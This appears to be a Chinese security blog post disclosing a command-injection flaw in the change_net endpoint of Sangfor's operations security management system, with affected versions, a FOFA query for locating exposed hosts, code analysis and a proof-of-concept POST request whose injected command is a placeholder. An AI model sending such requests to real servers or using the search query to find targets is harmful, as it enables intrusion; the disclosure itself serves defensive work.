---
title: "深信服运维安全管理系统 change_net 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html
asset_dir: assets/深信服运维安全管理系统-change_net-远程命令执行漏洞
---

# 深信服运维安全管理系统 change\_net 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/3/2 08:35
- 476浏览
- [0评论](#comment)
- 8分钟阅读

深入探索

脚本

脚本语言

服务器

---

# 漏洞简介

深信服运维安全管理系统 change\_net 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

文件大小转换

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

深入探索

Web安全书籍

安全运维咨询

安全认证考试

看下 `com.sbr.fort.web.controller.system.netconfig.NetConfigController#changeNet`的实现逻辑

[![深信服运维安全管理系统 change_net 远程命令执行漏洞](images/img-001-390ca7892232.webp)](https://image.mrxn.net/a166418764d44f7483f2690261d39cad.webp)

从请求获取多个参数如ethnum、address、netmask、bnum等等，然后对这些参数进行拼接

漏洞预警服务

[![深信服运维安全管理系统 change_net 远程命令执行漏洞](images/img-002-f0b33e01111c.webp)](https://image.mrxn.net/6786384d3e514fdc87e61a92d1e07fbb.webp)

[![深信服运维安全管理系统 change_net 远程命令执行漏洞](images/img-003-fc27580cc958.webp)](https://image.mrxn.net/3a8a8e45cab54e83ae80e487fdf6e84d.webp)

拼接完成后

计算机服务器

[![深信服运维安全管理系统 change_net 远程命令执行漏洞](images/img-004-ac1acc73d434.webp)](https://image.mrxn.net/3c621d40dad24d5397dda09dc4dfa3d2.webp)

调用`ShellExecutor`类的`exe`方法进行执行shell[脚本](#)，从而造成[命令执行](https://mrxn.net/tag/rce)漏洞。

漏洞修复的版本在命令执行时，增加了一个`clean`方法对特殊字符的替换操作

脚本语言

[![深信服运维安全管理系统 change_net 远程命令执行漏洞](images/img-005-02494ba0d448.webp)](https://image.mrxn.net/fbb1aa7dc3134624b8f7de62a341767e.webp)

[![深信服运维安全管理系统 change_net 远程命令执行漏洞](images/img-006-1cf8bb27a6c3.webp)](https://image.mrxn.net/24f3ebc925ab4adc9624c3601e608feb.webp)

紧接着的 `change_gate_way` 亦如此，参数**ethnum**与**gateway**直接拼接进`cmd`中后调用`executor.exe`执行

[![深信服运维安全管理系统 change_net 远程命令执行漏洞](images/img-007-d5288974dc96.webp)](https://image.mrxn.net/3e4b75b60e1741f58d235ee58d3934cc.webp)

# 漏洞复现

[![深信服运维安全管理系统 change_net 远程命令执行漏洞](images/img-008-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

> 多个参数均存在命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，这里以ethnum为例
>
> 漏洞预警服务

```
POST /fort/system;help/netConfig/change_net HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

sta=static&ipv=4&ethnum=RCE_POC &address=1.1.1.1&netmask=2.2.2.2&gateWay=3.3.3.3
```

访问命令执行结果文件

[![深信服运维安全管理系统 change_net 远程命令执行漏洞](images/img-009-f9f9f9d5337d.webp)](https://image.mrxn.net/075fd8c3f77047d99ba8c31646218c8f.webp)

成功得到[命令执行](https://mrxn.net/tag/rce)结果

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.POC](#toc-5-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
